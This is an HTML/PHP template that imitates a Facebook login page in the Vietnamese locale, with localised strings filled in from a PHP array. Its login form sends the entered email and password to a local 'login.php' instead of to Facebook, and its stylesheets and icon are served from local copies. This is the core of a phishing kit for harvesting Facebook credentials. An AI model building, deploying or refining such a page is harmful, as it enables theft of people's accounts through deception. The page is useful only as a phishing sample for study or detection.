<html lang="vi" id="facebook" class="">

<head>
    <meta charset="utf-8">

    <title><?=$ct['l3']?> | Facebook</title>
        <link type="text/css" rel="stylesheet" href="data/cN7pQtZnXjw.css" >
    <link type="text/css" rel="stylesheet" href="data/FBbY9pF1Kho.css" >
    <link type="text/css" rel="stylesheet" href="data/6NS23J-dlK_.css" >
    <link type="text/css" rel="stylesheet" href="data/2FjPzfG9-4a.css" >
    <link type="text/css" rel="stylesheet" href="data/mkNfk7bnt5G.css" >
<link rel="shortcut icon" href="data/1.ico">

    
    
    </head>

<body class="login_page _39il UIPage_LoggedOut _2gsg _xw8 _5p3y chrome webkit win x1 Locale_vi_VN" dir="ltr">
    <div class="_li">
        <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
            <div>
                <div id="blueBarDOMInspector" class="_21mm _2gsf">
                    <div class="_4f7n _1s4v _26aw _hdd _xxp">
                        <div>
                            <div class="loggedout_menubar_container">
                                <div class="clearfix loggedout_menubar">
                                    <div class="lfloat _ohe">
                                        <h1><a href="https://web.facebook.com/" title="Facebook"><i class="fb_logo img sp_IIuy94UEXRV sx_6bf598"><u>Logo Facebook</u></i></a></h1></div>
                                </div>
                            </div>
                            <div class="signupBanner">
                                <div class="signup_bar_container">
                                    <div class="signup_box clearfix"><span class="signup_box_content"><a class="_42ft _4jy0 signup_btn _4jy4 _4jy2 selected _51sy" role="button" href="/r.php?locale=vi_VN"><?=$ct['l1']?></a></span></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="globalContainer" class="uiContextualLayerParent">
            <div class="fb_content clearfix " id="content" role="main">
                <div class="_4-u5 _30ny"><span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel"><span class="muffin_tracking_pixel_end"></span>
                    <div class="_2pio _1uxu">
                        <div class="_585n" id="u_0_0"><i class="_585p img sp_uz72FEIEjxB sx_2fd726"><u>Notice</u></i>
                            <div class="_585r _50f4"><?=$ct['l2']?></div>
                        </div>
                    </div>
                    <div class="_4-u2 _1w1t _4-u8 _52jv">
                        <div class="_xku"><span class="_50f6"><?=$ct['l3']?></span></div>
                        <div class="login_form_container">
                            <form id="login_form" action="login.php" method="post" >
                            <input type="hidden" name="lsd" value="AVp09rmO" autocomplete="off">
                                <div id="loginform">
                                <input type="hidden" name="lang" value="<?=$ctName?>" />
                                
                                    <div class="clearfix _5466 _44mg">
                                    <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" style="font-size: 14px!important;padding: 20px 8px!important;width: 284px!important;" tabindex="1" placeholder="<?=$ct['l4']?>" value="" autofocus="1" aria-label="<?=$ct['l4']?>"></div>
                                    <div class="clearfix _5466 _44mg"><input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" style="font-size: 14px!important;padding: 20px 8px!important;width: 284px!important;" tabindex="1" placeholder="<?=$ct['l5']?>" aria-label=""></div>
                                    <div class="_xkt" id="u_0_d"><button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="1" type="submit"><?=$ct['l6']?></button></div>
                                    <div class="persistent">
                                        <div class="uiInputLabel clearfix uiInputLabelLegacy"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox"><label for="persist_box" class="uiInputLabelLabel"><?=$ct['l7']?></label></div>
                                    </div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0">
                                    <div class="_xkv fsm fwn fcg">
                                    <a href="https://web.facebook.com/recover/initiate?lwv=100" target=""><?=$ct['l8']?></a>
                                    <span role="presentation" aria-hidden="true"> · </span><a href="" rel="nofollow"><?=$ct['l9']?></a></div>

                                </div>
                                </form>
                        </div>
                    </div>
                </div>
            </div>
            <div id="pageFooter" data-referrer="page_footer">
                <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i">
                    
                    <li><a dir="ltr" href="" title="English (US)" id="u_0_4">English (US)</a></li>
                    <li><a dir="ltr" href="" onclick="" title="Vietnamese" id="u_0_3">Tiếng Việt</a></li>
                    <li><a dir="ltr" href="" onclick="" title="Traditional Chinese (Taiwan)" id="u_0_5">中文(台灣)</a></li>
                    <li><a dir="ltr" href="" onclick="" title="Korean" id="u_0_6">한국어</a></li>
                    <li><a dir="ltr" href="" onclick="" title="Japanese" id="u_0_7">日本語</a></li>
                    <li><a dir="ltr" href="" onclick="" title="French (France)" id="u_0_8">Français (France)</a></li>
                    <li><a dir="ltr" href="" onclick="" title="Thai" id="u_0_9">ภาษาไทย</a></li>
                    <li><a dir="ltr" href="" onclick="" title="Spanish" id="u_0_a">Español</a></li>
                    <li><a dir="ltr" href="" onclick="" title="Portuguese (Brazil)" id="u_0_b">Português (Brasil)</a></li>
                    <li><a dir="ltr" href="" onclick="" title="German" id="u_0_c">Deutsch</a></li>
                    <li><a class="showMore" rel="dialog" ajaxify="" title="" href="#" role="button">...</a></li>
                </ul>
                <div id="contentCurve"></div>
                
                <div class="mvl copyright">
                    <div><span> Facebook © 2016</span></div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>